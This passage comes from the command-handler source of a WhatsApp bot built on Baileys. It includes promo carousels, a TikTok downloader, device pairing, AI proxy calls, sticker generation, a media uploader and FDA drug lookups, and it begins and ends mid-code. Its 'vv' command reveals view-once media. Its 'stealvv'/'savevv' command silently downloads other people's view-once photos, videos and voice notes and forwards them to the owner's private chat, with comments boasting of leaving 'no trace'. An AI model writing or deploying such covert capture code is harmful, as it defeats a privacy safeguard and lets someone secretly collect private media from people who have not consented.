                imgField = { imageMessage: imageMsg.imageMessage, hasMediaAttachment: true };
            }
        } catch (imgErr) {
            logger.info('Image load failed, continuing without image:', imgErr.message);
        }

        // Build a single card (carousel with one card)
        const card = {
            header: {
                title: `${botName.toUpperCase()}`,
                hasMediaAttachment: !!imgField.hasMediaAttachment,
                ...(imgField.hasMediaAttachment ? { imageMessage: imgField.imageMessage } : {})
            },
            body: { text: '𝐅𝐑𝐄𝐄\n🤖 Fully featured WhatsApp bot\n🔗 Pair via Telegram\n⚡ Active support' },
            footer: { text: `© ${botName.toUpperCase()}` },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '📱 Contact Dev',
                            url: 'https://wa.me/254108595201'
                        })
                    },
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '📢 Join Channel',
                            url: 'https://whatsapp.com/channel/0029VbCIYMV77qVODCql8W17'
                        })
                    },
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🤖 Bot V3',
                            url: 'https://t.me/namelessmzaziv3Bot'
                        })
                    }
                ]
            }
        };

        const interactiveMsg = generateWAMessageFromContent(chatId, {
            interactiveMessage: {
                body: { text: `${botName.toUpperCase()} - Tap buttons below` },
                footer: { text: 'Swipe for more ➡️' },
                carouselMessage: { cards: [card] },
                contextInfo: {}
            }
        }, {}); // No quoted – safe!

        await mzazi.relayMessage(chatId, interactiveMsg.message, { messageId: interactiveMsg.key.id });

    } catch (error) {
        logger.error('Repo interactive error:', error);
        // Fallback plain text (always works)
        await mzazireply(
            `💰 *${botName.toUpperCase()}*\n\n` +
            `𝐅𝐑𝐄𝐄\n🤖 Fully featured WhatsApp bot\n🔗 Pair via Telegram\n⚡ Active support\n\n` +
            `📱 wa.me/254108595201\n` +
            `📢 whatsapp.com/channel/0029VbCIYMV77qVODCql8W17\n` +
            `🤖 t.me/namelessmzaziv3Bot\n` +
            `👥 chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N\n` +
            `🔗 t.me/namelessmzaziv4bot\n\n` +
            `© ${botName.toUpperCase()}`
        );
    }
    break;
}


//=====================================//

case 'repo2': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // ─── Load local menu image (same as mzazi case) ─────────────
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // ──────────────────────────────────────────────────────────────
        // 2. Define cards (split buttons into multiple cards)
        // ──────────────────────────────────────────────────────────────
        const commonHeader = {
            title: `${botName.toUpperCase()}`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: '💰 *FREE TIER*\n🤖 Fully featured WhatsApp bot\n🔗 Quick pairing\n⚡ 24/7 Active support' },
                footer: { text: 'Page 1/3 • Contact developer' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📱 Contact Developer',
                                url: 'https://wa.me/254108595201'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📢 Join Channel',
                                url: 'https://whatsapp.com/channel/0029VbCIYMV77qVODCql8W17'
                            })
                        }
                    ]
                }
            },
            {
                header: commonHeader,
                body: { text: '🤖 *BOT VERSIONS*\nGet your own bot instance\n⚡ Fast & Reliable' },
                footer: { text: 'Page 2/3 • Telegram bots' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🤖 Bot Version 3',
                                url: 'https://t.me/namelessmzaziv3Bot'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🤖 Bot Version 4',
                                url: 'https://t.me/namelessmzaziv4bot'
                            })
                        }
                    ]
                }
            },
            {
                header: commonHeader,
                body: { text: '👥 *COMMUNITY*\nJoin our WhatsApp group\nGet help & updates' },
                footer: { text: 'Page 3/3 • Support group' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '👥 Join WhatsApp Group',
                                url: 'https://chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '⭐ Rate Bot',
                                url: 'https://wa.me/254108595201?text=I%20love%20the%20bot!'
                            })
                        }
                    ]
                }
            }
        ];

        // ──────────────────────────────────────────────────────────────
        // 3. Build carousel message (no "quoted")
        // ──────────────────────────────────────────────────────────────
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🛒 *${botName.toUpperCase()} SHOP* - Swipe to browse` },
                    footer: { text: `© ${botName.toUpperCase()} • Tap any button` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // ← NO quoted → SAFE
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

        // Optional success indicator
        await reply('✅ Menu sent – swipe left/right to see all options');

    } catch (error) {
        logger.error('Repo2 carousel error:', error);

        // Fallback plain text with all links
        const fallbackText = 
`💰 *${botName.toUpperCase()} SHOP* 💰

╭━━━〔 FREE TIER 〕━━━⬣
│ 🤖 Fully featured WhatsApp bot
│ 🔗 Quick pairing
│ ⚡ 24/7 support
╰━━━━━━━━━━━━━━⬣

📱 *Contact Developer*: wa.me/254108595201
📢 *Channel*: whatsapp.com/channel/0029VbCIYMV77qVODCql8W17
🤖 *Bot V3*: t.me/namelessmzaziv3Bot
🤖 *Bot V4*: t.me/namelessmzaziv4bot
👥 *Group*: chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N

© ${botName.toUpperCase()}`;

        await mzazireply(fallbackText);
    }
    break;
}
//=====================================//

case "tiktok":
//=====================================//

case "tikdl": {
try {

if (!m.chat) return logger.info("Chat Undefined")

if (!text) {
return mzazireply("Please provide a TikTok link.")
}

if (!text.includes("tiktok.com")) {
return mzazireply("Invalid TikTok link.")
}

// React
await mzazi.sendMessage(m.chat, {
react: {
text: "⏳",
key: m.key
}
})

const axios = require("axios")

const res = await axios.get(
`https://api.bk9.dev/download/tiktok?url=${encodeURIComponent(text)}`
)

const data = res.data

if (!data.status || !data.BK9) {
return mzazireply("Failed to fetch TikTok video.")
}

const videoUrl = data.BK9.BK9

if (!videoUrl) {
return mzazireply("Video URL not found.")
}

// Info message
await mzazi.sendMessage(m.chat, {
text: "Downloading TikTok video..."
}, { quoted: m })

// Send video
await mzazi.sendMessage(m.chat, {
video: { url: videoUrl },
caption: `DOWNLOADED BY ${botName.toUpperCase()}`
}, { quoted: m })

// Success react
await mzazi.sendMessage(m.chat, {
react: {
text: "✅",
key: m.key
}
})

} catch (err) {

logger.info(err)

await mzazi.sendMessage(m.chat, {
text: `Error:\n${err.message}`
}, { quoted: m })

}
}
break;

//=====================================//

case "connect": {
  if (!isOwner) return mzazireply("❌ Owner only command!");

  let number = text.trim();
  if (!number) return mzazireply(`📌 Usage: ${prefix}pair 254XXXXXXXXX`);

  // Clean number: remove +, spaces, non-digits
  number = number.replace(/[^0-9]/g, '');
  if (!number.startsWith('254')) number = '254' + number.replace(/^0+/, '');
  if (number.length < 10 || number.length > 15) {
    return mzazireply("❌ Invalid phone number! Use international format (e.g., 2547XXXXXXXX)");
  }

  // Send loading
  await mzazireply("⏳ Generating pairing code...");

  // Session folder
  const sessionDir = `./sessions/${number}`;
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
  const makeWASocket =
    baileys.makeWASocket ||
    baileys.default?.makeWASocket ||
    (typeof baileys.default === "function" ? baileys.default : null);
  const pino = require("pino");
  const NodeCache = require("node-cache");
  const msgRetryCounterCache = new NodeCache();

  let pairingSock = null;
  let timeoutId = null;

  const cleanup = () => {
    if (timeoutId) clearTimeout(timeoutId);
    if (pairingSock) {
      pairingSock.end(new Error("Pairing process ended"));
      pairingSock = null;
    }
  };

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    pairingSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,        // No QR in terminal
      browser: ["MZAZI TECH QUARTZ BOT", "Chrome", "1.0.0"],
      logger: pino({ level: "silent" }),
      msgRetryCounterCache,
      generateHighQualityLinkPreview: false,
      // Force pairing code, never show QR
      qrTimeout: 30000,
    });

    let pairingCodeGenerated = false;

    pairingSock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        if (!pairingCodeGenerated) {
          pairingCodeGenerated = true;
          try {
            // Request the 8-digit pairing code
            const code = await pairingSock.requestPairingCode(number);
            await mzazireply(`🔐 *PAIRING CODE*\n\n➤ *${code}*\n\n_Enter this code on WhatsApp (Settings → Linked Devices → Link a Device)_\n\n⏳ Waiting for successful link...`);
            // Auto cleanup after 2 minutes
            timeoutId = setTimeout(() => {
              mzazireply("⏰ Pairing timeout. Please try again.");
              cleanup();
            }, 120000);
          } catch (err) {
            mzazireply(`❌ Failed to generate pairing code: ${err.message}`);
            cleanup();
          }
        }
      }

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
        if (!shouldReconnect) {
          mzazireply("✅ Session saved. Pairing completed.");
        } else {
          mzazireply("⚠️ Connection closed unexpectedly.");
        }
        cleanup();
      }
    });

    pairingSock.ev.on("creds.update", async () => {
      await saveCreds();
      mzazireply(`✅ *Success!* Session for ${number} has been saved.\nYou can now use this number with the bot.`);
      cleanup();
    });

  } catch (err) {
    logger.error("Pairing error:", err);
    mzazireply(`❌ Error: ${err.message}`);
    cleanup();
  }
}
break;


//=====================================//

case "ai2": {
try {

if (!text) {
return mzazireply(
`🤖 *${botName.toUpperCase()} AI ASSISTANT*\n\n` +
`Usage: ${prefix}gpt <question>\n` +
`Example: ${prefix}gpt explain quantum physics`
);
}



// loading
await mzazireply("🧠 Thinking...");

// AI APIs
const AI_APIS = [

(q) =>
`https://mistral.stacktoy.workers.dev/?apikey=Suhail&text=${encodeURIComponent(q)}`,

(q) =>
`https://llama.gtech-apiz.workers.dev/?apikey=Suhail&text=${encodeURIComponent(q)}`,

(q) =>
`https://mistral.gtech-apiz.workers.dev/?apikey=Suhail&text=${encodeURIComponent(q)}`

];

let answer = null;

// fallback system
for (const api of AI_APIS) {

try {

const { data } = await axios.get(
api(text),
{
timeout: 15000
}
);

const response =
data?.data?.response ||
data?.response ||
data?.result;

if (
response &&
typeof response === "string" &&
response.trim()
) {

answer = response.trim();
break;

}

} catch (err) {

logger.info(
"AI API FAILED:",
err.message
);

continue;

}
}

// if all APIs fail
if (!answer) {
return mzazireply(
"❌ Failed to get AI response.\nTry again later."
);
}

// prevent long WhatsApp messages
if (answer.length > 4000) {
answer =
answer.slice(0, 4000) +
"\n\n_...response truncated_";
}

// final response
let finalText =
`🤖 *${botName.toUpperCase()} AI RESPONSE*\n`;

finalText +=
`─────────────────────\n\n`;

finalText +=
`${answer}\n\n`;

finalText +=
`─────────────────────\n`;

finalText +=
`⚡ Powered By ${botName.toUpperCase()}`;

await mzazireply(finalText);

} catch (e) {

logger.info("AI ERROR:", e);

mzazireply(
`❌ AI Error\n\n${e.message}`
);

}
}
break;

//=====================================//

case "attp":
//=====================================//

case "texts":
//=====================================//

case "textsticker": {
  try {
    const { spawn } = require("child_process");
    const fs = require("fs");
    const { writeExifVid } = require("./helper/exif");

    if (!text) {
      return mzazireply(
        `✨ *${botName.toUpperCase()} ATTP*\n\n` +
        `Usage: ${prefix}attp Hello`
      );
    }

    // Helper function (unchanged)
    const renderBlinkingVideoWithFfmpeg = (text) => {
      return new Promise((resolve, reject) => {
        const fontPath = process.platform === "win32"
          ? "C:/Windows/Fonts/arialbd.ttf"
          : "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf";

        const escapeDrawtextText = (s) =>
          s
            .replace(/\\/g, "\\\\")
            .replace(/:/g, "\\:")
            .replace(/,/g, "\\,")
            .replace(/'/g, "\\'")
            .replace(/\[/g, "\\[")
            .replace(/\]/g, "\\]")
            .replace(/%/g, "\\%");

        const safeText = escapeDrawtextText(text);
        const safeFontPath = process.platform === "win32"
          ? fontPath.replace(/\\/g, "/").replace(":", "\\:")
          : fontPath;

        const cycle = 0.3;
        const dur = 1.8;

        const drawRed = `drawtext=fontfile='${safeFontPath}':text='${safeText}':fontcolor=red:borderw=2:bordercolor=black@0.6:fontsize=56:x=(w-text_w)/2:y=(h-text_h)/2:enable='lt(mod(t,${cycle}),0.1)'`;
        const drawBlue = `drawtext=fontfile='${safeFontPath}':text='${safeText}':fontcolor=blue:borderw=2:bordercolor=black@0.6:fontsize=56:x=(w-text_w)/2:y=(h-text_h)/2:enable='between(mod(t,${cycle}),0.1,0.2)'`;
        const drawGreen = `drawtext=fontfile='${safeFontPath}':text='${safeText}':fontcolor=green:borderw=2:bordercolor=black@0.6:fontsize=56:x=(w-text_w)/2:y=(h-text_h)/2:enable='gte(mod(t,${cycle}),0.2)'`;
        const filter = `${drawRed},${drawBlue},${drawGreen}`;

        const args = [
          "-y", "-f", "lavfi", "-i",
          `color=c=black:s=512x512:d=${dur}:r=20`,
          "-vf", filter,
          "-c:v", "libx264",
          "-pix_fmt", "yuv420p",
          "-movflags", "+faststart+frag_keyframe+empty_moov",
          "-t", String(dur),
          "-f", "mp4", "pipe:1"
        ];

        const ff = spawn("ffmpeg", args);
        const chunks = [];
        const errors = [];

        ff.stdout.on("data", d => chunks.push(d));
        ff.stderr.on("data", e => errors.push(e));
        ff.on("error", reject);
        ff.on("close", code => {
          if (code === 0) return resolve(Buffer.concat(chunks));
          reject(new Error(Buffer.concat(errors).toString() || `ffmpeg exited with code ${code}`));
        });
      });
    };

    await mzazireply("✨ Creating animated sticker...");

    const mp4Buffer = await renderBlinkingVideoWithFfmpeg(text);
    const webpPath = await writeExifVid(mp4Buffer, {
      packname: `${botName.toUpperCase()}`,
      author: "Mzazi Tech"
    });
    const webpBuffer = fs.readFileSync(webpPath);
    fs.unlinkSync(webpPath);

    // 🔥 FIX: Use a safe chat JID (sender) and remove the problematic "quoted" parameter
    const chatId = sender; // sender is already validated in the main handler (m.key.remoteJid)
    if (!chatId || typeof chatId !== "string" || !chatId.includes("@")) {
      throw new Error("Invalid chat JID: " + chatId);
    }

    await mzazi.sendMessage(chatId, { sticker: webpBuffer }); // No quoted: m

  } catch (e) {
    logger.info("ATTP ERROR:", e);
    mzazireply(`❌ Failed to generate sticker\n\n${e.message || e}`);
  }
  break;
}

// ─────────────────────────────────────────────
// CASE: .vv / .viewonce / .revealvv – Reveal view‑once in the group
// ─────────────────────────────────────────────
//=====================================//

case 'vv':
//=====================================//

case 'viewonce':
//=====================================//

case 'revealvv': {
    try {
        const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedMsg) return mzazireply('❌ Reply to a *view‑once* image / video / voice note.');

        // Unwrap view‑once layers (Baileys structure)
        let inner = quotedMsg.viewOnceMessage?.message ||
                    quotedMsg.viewOnceMessageV2?.message ||
                    quotedMsg.viewOnceMessageV2Extension?.message ||
                    quotedMsg;
        
        const mediaType = Object.keys(inner).find(k => 
            k === 'imageMessage' || k === 'videoMessage' || k === 'audioMessage'
        );
        if (!mediaType) return mzazireply('❌ That message is not a view‑once media.');

        const media = inner[mediaType];
        const stream = await downloadMediaMessage(
            { key: m.key, message: { [mediaType]: media } },
            'buffer',
            {},
            { logger: pino({ level: 'silent' }), reuploadRequest: mzazi.updateMediaMessage }
        );

        const caption = `👁️ *View‑Once Revealed*\n📤 From: @${senderNum}\n📝 Caption: ${media.caption || '_no caption_'}`;
        
        if (mediaType === 'imageMessage') {
            await mzazi.sendMessage(sender, { image: stream, caption, mentions: [msgSender] });
        } else if (mediaType === 'videoMessage') {
            await mzazi.sendMessage(sender, { video: stream, caption, mentions: [msgSender] });
        } else { // audioMessage
            await mzazi.sendMessage(sender, { audio: stream, mimetype: 'audio/mp4', ptt: !!media.ptt });
            await mzazi.sendMessage(sender, { text: caption, mentions: [msgSender] });
        }
    } catch (err) {
        logger.error('ViewOnce reveal error:', err);
        mzazireply(`❌ Failed to reveal: ${err.message || err}`);
    }
}
break;

// ─────────────────────────────────────────────
// CASE: .vv2 / .savevv / .stealvv – Stealth save view‑once to owner's DM (owner only)
// ─────────────────────────────────────────────
//=====================================//

case 'vv2':
//=====================================//

case 'stealvv':
//=====================================//

case 'savevv': {
  // ── Only the bot owner can use this ──────────────────────────
  if (!isOwner) break; // silently ignore – no reply, no reaction

  // Owner's private DM – we send the stolen media here
  const ownerDM = `${ownerNumbers[0]}@s.whatsapp.net`; // primary owner

  try {
    // ── 1. Get quoted message ─────────────────────────────────────
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg) {
      await mzazi.sendMessage(ownerDM, { text: '❌ *VV2:* Reply to a view‑once media.' });
      break;
    }

    // ── 2. Unwrap all view‑once wrappers ─────────────────────────
    let inner = quotedMsg;
    if (inner?.viewOnceMessage) inner = inner.viewOnceMessage.message;
    if (inner?.viewOnceMessageV2) inner = inner.viewOnceMessageV2.message;
    if (inner?.viewOnceMessageV2Extension) inner = inner.viewOnceMessageV2Extension.message;
    if (inner?.ephemeralMessage) inner = inner.ephemeralMessage.message;

    const mediaType = ['imageMessage', 'videoMessage', 'audioMessage'].find(k => inner?.[k]);
    if (!mediaType) {
      await mzazi.sendMessage(ownerDM, { text: '❌ *VV2:* No view‑once media found.' });
      break;
    }

    const media = inner[mediaType];

    // ── 3. Build a proper fake key for download ──────────────────
    const ctxInfo = m.message?.extendedTextMessage?.contextInfo || {};
    const fakeKey = {
      remoteJid: sender,                          // chat where the quoted message lives
      fromMe: false,
      id: ctxInfo?.stanzaId || m.key.id,          // real message ID of the quoted message
      participant: ctxInfo?.participant || m.key.participant, // sender of quoted
    };

    const fakeMsg = {
      key: fakeKey,
      message: { [mediaType]: media },
    };

    // ── 4. Download the media ──────────────────────────────────────
    const stream = await downloadMediaMessage(
      fakeMsg,
      'buffer',
      {},
      {
        logger: pino({ level: 'silent' }),
        reuploadRequest: mzazi.updateMediaMessage,
      }
    );

    // ── 5. Build stealth caption ──────────────────────────────────
    const chatLabel = isGroup
      ? (await mzazi.groupMetadata(sender)).subject || sender
      : 'DM';

    const caption =
      `🕵️ *Steal VV (Silent)*\n\n` +
      `👤 *From:* @${senderNum}\n` +
      `💬 *Chat:* ${chatLabel}\n` +
      `📂 *Type:* ${mediaType.replace('Message', '')}\n` +
      `📝 *Caption:* ${media.caption || 'none'}\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}`;

    // ── 6. Send to owner's DM ─────────────────────────────────────
    const ctx = {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363425539800408@newsletter',
        newsletterName: botName.toUpperCase(),
        serverMessageId: 143,
      },
    };

    if (mediaType === 'imageMessage') {
      await mzazi.sendMessage(ownerDM, { image: stream, caption, contextInfo: ctx });
    } else if (mediaType === 'videoMessage') {
      await mzazi.sendMessage(ownerDM, { video: stream, caption, contextInfo: ctx });
    } else { // audio
      await mzazi.sendMessage(ownerDM, {
        audio: stream,
        mimetype: 'audio/mp4',
        ptt: !!media.ptt,
        contextInfo: ctx,
      });
      await mzazi.sendMessage(ownerDM, { text: caption, contextInfo: ctx });
    }

    // ── 7. Absolutely no trace in original chat ──────────────────
    // No reply, no reaction, no read receipt, no typing.

  } catch (err) {
    logger.error('VV2 error:', err?.message || err);
    try {
      await mzazi.sendMessage(ownerDM, { text: `❌ *VV2 Failed:*\n${err?.message || err}` });
    } catch {}
  }
  break;
}

// ─────────────────────────────────────────────
// CASE: .url / .geturl / .mediaurl – Upload media to URL
// ─────────────────────────────────────────────
//=====================================//

case 'url':
//=====================================//

case 'geturl':
//=====================================//

case 'mediaurl': {
  try {
    // Helper: extract quoted message
    const getQuotedMsg = () => {
      const ctx = m.message?.extendedTextMessage?.contextInfo;
      if (!ctx?.quotedMessage) return null;
      return {
        key: {
          remoteJid: sender,
          fromMe: false,
          id: ctx.stanzaId,
          participant: ctx.participant
        },
        message: ctx.quotedMessage
      };
    };

    // Helper: get file extension from message type
    const getExt = (msg) => {
      const msgObj = msg.message;
      if (msgObj.imageMessage) return '.jpg';
      if (msgObj.videoMessage) return '.mp4';
      if (msgObj.audioMessage) return '.mp3';
      if (msgObj.stickerMessage) return '.webp';
      if (msgObj.documentMessage) {
        return path.extname(msgObj.documentMessage.fileName || '') || '.bin';
      }
      return null;
    };

    let targetMsg = null;
    // Check if current message is media
    if (m.message?.imageMessage ||
        m.message?.videoMessage ||
        m.message?.audioMessage ||
        m.message?.stickerMessage ||
        m.message?.documentMessage) {
      targetMsg = m;
    }
    // Otherwise check quoted message
    if (!targetMsg) {
      const quoted = getQuotedMsg();
      if (quoted) targetMsg = quoted;
    }

    if (!targetMsg) {
      return mzazireply('📎 Send or reply to an image, video, audio, sticker, or document to get a direct URL.');
    }

    const ext = getExt(targetMsg);
    if (!ext) return mzazireply('❌ Unsupported media type.');

    // Download buffer using Baileys helper
    const buffer = await downloadMediaMessage(
      targetMsg,
      'buffer',
      {},
      { logger: pino({ level: 'silent' }), reuploadRequest: mzazi.updateMediaMessage }
    );
    if (!buffer) throw new Error('Failed to download media');

    // Create temp directory and file
    const tempDir = path.join(process.cwd(), 'tmp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    const tempPath = path.join(tempDir, `${Date.now()}${ext}`);
    fs.writeFileSync(tempPath, buffer);

    let url = '';
    try {
      // For images, try Telegra.ph first, then Ugu
      if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext.toLowerCase())) {
        try {
          const { TelegraPh } = require('./helper/uploader.js');
          url = await TelegraPh(tempPath);
        } catch (telegErr) {
          const { UploadFileUgu } = require('./helper/uploader.js');
          const res = await UploadFileUgu(tempPath);
          url = typeof res === 'string' ? res : (res.url || res.url_full || '');
        }
      } else {
        // For other files, use Ugu
        const { UploadFileUgu } = require('./helper/uploader.js');
        const res = await UploadFileUgu(tempPath);
        url = typeof res === 'string' ? res : (res.url || res.url_full || '');
      }
    } finally {
      // Clean up temp file after a short delay
      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch (e) {}
      }, 2000);
    }

    if (!url) throw new Error('Upload failed – no URL returned');

    await mzazireply(`🔗 *Media URL*\n\n${url}`);
  } catch (err) {
    logger.error('URL command error:', err);
    mzazireply(`❌ Failed to generate URL: ${err.message || err}`);
  }
}
break;

//=====================================//

case 'medicine':
//=====================================//

case 'drug':
//=====================================//

case 'medinfo':
//=====================================//

case 'druginfo':
//=====================================//

case 'med': {
  const query = text.trim();
  if (!query) {
    return mzazireply(`💊 *Medicine Info*\n\n` +
      `*Usage:* \`${prefix}medicine <name>\`\n\n` +
      `*Examples:*\n` +
      `• \`${prefix}medicine aspirin\`\n` +
      `• \`${prefix}medicine paracetamol\`\n` +
      `• \`${prefix}medicine amoxicillin\`\n` +
      `• \`${prefix}medicine ibuprofen\`\n` +
      `• \`${prefix}medicine metformin\`\n\n` +
      `⚠️ _Information is from FDA database. Always consult a doctor._`);
  }

  await mzazireply(`🔍 Looking up *${query}*...`);

  try {
    const res = await axios.get(`https://api.fda.gov/drug/label.json?search=${encodeURIComponent(query)}&limit=1`, { timeout: 15000 });
    const result = res.data.results?.[0];
    if (!result) {
      return mzazireply(`❌ No information found for: *${query}*\n\nTry the generic name (e.g. paracetamol instead of Panadol)`);
    }

    const openfda = result.openfda || {};
    const brandName = openfda.brand_name?.[0] || query;
    const genericName = openfda.generic_name?.[0] || 'N/A';
    const manufacturer = openfda.manufacturer_name?.[0] || 'N/A';
    const route = openfda.route?.[0] || 'N/A';
    const substanceName = openfda.substance_name?.[0] || 'N/A';

    const clean = (text, maxLen = 400) => {
      if (!text) return 'N/A';
      const str = Array.isArray(text) ? text[0] : text;
      const cleaned = str.replace(/\n+/g, ' ').replace(/\s+/g, ' ').trim();
      return cleaned.length > maxLen ? `${cleaned.substring(0, maxLen)}...` : cleaned;
    };

    const purpose = clean(result.purpose, 300);
    const indications = clean(result.indications_and_usage, 400);
    const warnings = clean(result.warnings, 400);
    const sideEffects = clean(result.adverse_reactions, 400);
    const dosage = clean(result.dosage_and_administration, 300);
    const storage = clean(result.storage_and_handling, 200);

    let output = `💊 *${brandName}*\n`;
    if (genericName !== 'N/A') output += `_(${genericName})_\n`;
    output += `\n`;
    if (substanceName !== 'N/A') output += `🧪 *Active Substance:* ${substanceName}\n`;
    output += `🏭 *Manufacturer:* ${manufacturer}\n`;
    output += `💉 *Route:* ${route}\n\n`;
    if (purpose !== 'N/A') output += `🎯 *Purpose:*\n${purpose}\n\n`;
    if (indications !== 'N/A') output += `✅ *Uses:*\n${indications}\n\n`;
    if (dosage !== 'N/A') output += `📏 *Dosage:*\n${dosage}\n\n`;
    if (warnings !== 'N/A') output += `⚠️ *Warnings:*\n${warnings}\n\n`;
    if (sideEffects !== 'N/A') output += `🔴 *Side Effects:*\n${sideEffects}\n\n`;
    if (storage !== 'N/A') output += `📦 *Storage:* ${storage}\n\n`;
    output += `⚕️ _Always consult a qualified doctor before taking any medication._`;

    await mzazireply(output);
  } catch (error) {
    if (error.response?.status === 404) {
      return mzazireply(`❌ Medicine not found: *${query}*\n\nTry using the generic/scientific name.`);
    }
    mzazireply(`❌ Failed: ${error.message}`);
  }
  break;
}
// ─────────────────────────────────────────────
//  AUTOTYPING (owner only)
// ─────────────────────────────────────────────
//=====================================//

case 'autotyping':
//=====================================//

case 'autotype':
//=====================================//

case 'typing': {
  if (!isOwner) return mzazireply('❌ Owner only command.');
  const sub = args[0]?.toLowerCase();
  if (!sub || (sub !== 'on' && sub !== 'off')) {
    const cfg = getAutoTyping();
    return mzazireply(
      `⌨️ *Auto‑typing*\n\n` +
      `Status: ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n\n` +
      `Usage:\n.${prefix}autotyping on\ – enable typing simulation\n` +
      `${prefix}autotyping off\` – disable`
    );
  }
  const cfg = getAutoTyping();
  if (sub === 'on') {
    if (cfg.enabled) return mzazireply('⚠️ Auto‑typing already ON.');
    setAutoTyping(true);
    mzazireply('✅ Auto‑typing enabled. Bot will now show "typing..." while processing.');
  } else {
    if (!cfg.enabled) return mzazireply('⚠️ Auto‑typing already OFF.');
    setAutoTyping(false);
    mzazireply('❌ Auto‑typing disabled.');
  }
  break;
}

// ─────────────────────────────────────────────
//  AUTO‑RECORD AUDIO (owner only)
// ─────────────────────────────────────────────

// ─────────────────────────────────────────────
//  ALWAYS ONLINE (owner only)
// ─────────────────────────────────────────────
//=====================================//

case 'alwaysonline':
//=====================================//

case 'online': {
  if (!isOwner) return mzazireply('❌ Owner only.');
  const sub = args[0]?.toLowerCase();
  if (!sub || (sub !== 'on' && sub !== 'off')) {
    const cfg = getAlwaysOnline();
    return mzazireply(
      `🟢 *Always Online*\n\n` +
      `Status: ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n\n` +
      `When ON, bot will keep "online" status.\n\n` +
      `Usage: ${prefix}alwaysonline on/off`
    );
  }
  const cfg = getAlwaysOnline();
  if (sub === 'on') {
    if (cfg.enabled) return mzazireply('⚠️ Always online already ON.');
    setAlwaysOnline(true);
    startAlwaysOnline(mzazi); // start the interval
    mzazireply('✅ Always online enabled. Bot will show as online.');
  } else {
    if (!cfg.enabled) return mzazireply('⚠️ Always online already OFF.');
    setAlwaysOnline(false);
    // We don't stop interval – on restart it won't start; you may track interval ID if needed.
    mzazireply('❌ Always online disabled.');
  }
  break;
}

// ──────────────────────────────────────────────────────────
// TEST: interactiveMessage with native flow + single‑select
// ──────────────────────────────────────────────────────────
// ══════════════════════════════════════════════════════
// MENU PIC HELPER
// ══════════════════════════════════════════════════════


// ══════════════════════════════════════════════════════
// TEST: interactiveMessage format 1
// ══════════════════════════════════════════════════════
//=====================================//

case 'itest1': {

    const imgPath = getMenuPic();
    const imgBuffer = fs.readFileSync(imgPath);

    try {
        await mzazi.sendMessage(sender, {
            image: imgBuffer,
            caption: "🧪 ITEST1 WORKING",
            footer: `${botName}`,
            buttons: [
                {
                    buttonId: `${prefix}menu`,
                    buttonText: { displayText: "📋 MENU" },
                    type: 1
                },
                {
                    buttonId: `${prefix}ping`,
                    buttonText: { displayText: "🏓 PING" },
                    type: 1
                }
            ],
            headerType: 4
        }, { quoted: m });

        await mzazireply("✅ itest1 sent successfully.");
    } catch (e) {
        logger.info(e);
        mzazireply(`❌ Error: ${e.message}`);
    }

    break;
}

// ══════════════════════════════════════════════════════
// TEST: minimal buttons
// ══════════════════════════════════════════════════════
//=====================================//

case 'itest2': {
    if (!isOwner) return mzazireply("❌ Owner only.");

    const imgPath = getMenuPic();
    const imgBuffer = fs.readFileSync(imgPath);

    try {
        await mzazi.sendMessage(sender, {
            image: imgBuffer,
            caption: `🤖 ${botName}\n\nPrefix: ${prefix}`,
            footer: "Mzazi Tech",
            buttons: [
                {
